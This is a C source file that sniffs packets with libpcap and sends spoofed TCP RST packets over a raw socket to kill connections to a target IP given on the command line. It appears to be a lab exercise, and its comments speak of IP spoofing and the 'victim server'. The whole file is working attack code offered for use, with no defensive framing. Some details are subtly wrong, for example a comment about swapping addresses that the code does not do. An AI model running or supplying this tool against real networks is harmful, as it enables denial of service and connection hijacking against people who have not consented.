// to compile: gcc rst2.c -lpcap

#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/if_ether.h>

// Function to compute the checksum of the packet
unsigned short checksum(void *b, int len) { // 'b' is a pointer to the packet, 'len' is the length
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

void send_tcp_rst(struct iphdr *iph, struct tcphdr *tcph) {
    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in dest;
    char packet[4096];
    
    memset(packet, 0, 4096);
    
    // enable IP_HDRINCL to tell the kernel that we are providing our own IP header
    // otherwise IP spoofing will fail, and wireshark would show this packet is coming from this current machine,
    // rather than coming from the victim server.
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    // IP Header
    struct iphdr *iph_out = (struct iphdr *)packet;
    iph_out->ihl = 5;
    iph_out->version = 4;
    iph_out->tos = 0;
    iph_out->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph_out->id = htons(54321);
    iph_out->frag_off = 0;
    iph_out->ttl = 255;
    iph_out->protocol = IPPROTO_TCP;
    iph_out->check = 0; // Leave checksum 0 now, fill later
    iph_out->saddr = iph->saddr; // Swap source and destination IPs
    iph_out->daddr = iph->daddr;
    
    // Assuming you already have `iph` (IP header) and `tcph` (TCP header):
    unsigned int ip_header_length = iph->ihl * 4; // IP header length in bytes
    unsigned int tcp_header_length = tcph->doff * 4; // TCP header length in bytes
    unsigned int ip_total_length = ntohs(iph->tot_len); // Total length of IP packet (network to host byte order)
    unsigned int tcp_payload_length = ip_total_length - ip_header_length - tcp_header_length;

    // current sequence number
    unsigned int seq_num = ntohl(tcph->seq); // Convert sequence number from network to host byte order

    // Next sequence number
    unsigned int next_seq_num = seq_num + tcp_payload_length;

    printf("Next sequence number: %u\n", next_seq_num);

    // TCP Header
    struct tcphdr *tcph_out = (struct tcphdr *)(packet + sizeof(struct iphdr));
    tcph_out->source = tcph->source;
    tcph_out->dest = tcph->dest;
    tcph_out->seq = htonl(next_seq_num);
    tcph_out->ack_seq = 0;
    tcph_out->doff = 5; // TCP header size
    tcph_out->fin = 0;
    tcph_out->syn = 0;
    tcph_out->rst = 1; // TCP RST flag
    tcph_out->psh = 0;
    tcph_out->ack = 0;
    tcph_out->urg = 0;
    tcph_out->window = htons(5840); /* maximum allowed window size */
    tcph_out->check = 0; // Leave checksum 0 now, fill later
    tcph_out->urg_ptr = 0;
    
    // IP checksum
    iph_out->check = checksum((unsigned short *)packet, iph_out->tot_len);
    
    // TCP checksum
    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
    } pseudoheader;
    
    pseudoheader.source_address = iph->saddr;
    pseudoheader.dest_address = iph->daddr;
    pseudoheader.placeholder = 0;
    pseudoheader.protocol = IPPROTO_TCP;
    pseudoheader.tcp_length = htons(sizeof(struct tcphdr));
    
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    memcpy(pseudogram, &pseudoheader, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph_out, sizeof(struct tcphdr));
    tcph_out->check = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram);
    
    // Set up destination address
    dest.sin_family = AF_INET;
    dest.sin_port = tcph_out->dest; // Set the destination port to the correct port from the captured packet
    dest.sin_addr.s_addr = iph_out->daddr;

    printf("Sending RST to IP: %s, Source Port: %d, Destination Port: %d, Sequence Number: %u\n", 
        inet_ntoa(*(struct in_addr *)&iph_out->daddr), ntohs(tcph_out->source), ntohs(tcph_out->dest), ntohl(tcph_out->seq));

    // Send the packet
    if (sendto(sock, packet, iph_out->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("Send failed");
    } else {
        printf("Sent TCP RST packet to %s\n", inet_ntoa(*(struct in_addr *)&iph_out->daddr));
    }

    close(sock);
}

// Packet handler function
void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    struct iphdr *iph = (struct iphdr *)(packet + sizeof(struct ethhdr));
    struct tcphdr *tcph = (struct tcphdr *)(packet + iph->ihl * 4 + sizeof(struct ethhdr));

    if (iph->protocol == IPPROTO_TCP) {
        char src_ip[INET_ADDRSTRLEN];
        char dst_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(iph->saddr), src_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &(iph->daddr), dst_ip, INET_ADDRSTRLEN);

        // Assume target IP is specified in user_data
        char *target_ip = (char *)user_data;

        // Check if the destination IP matches the user-specified target IP
        if (strcmp(dst_ip, target_ip) == 0) {
            printf("Captured TCP Packet destined to IP: %s\n", dst_ip);

            // Send the TCP RST packet
            send_tcp_rst(iph, tcph);
        }
    }
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <interface> <target_ip>\n", argv[0]);
        return 1;
    }

    char *dev = argv[1]; // Network interface to sniff on.
    char *target_ip = argv[2]; // Target IP address to which RST packets should be sent.
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

    // Open the network device for packet capture in promiscuous mode
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }

    // Start packet capture; use packet_handler to process packets
    pcap_loop(handle, 0, packet_handler, (u_char *)target_ip);

    // Close the pcap session and release resources
    pcap_close(handle);
    return 0;
}

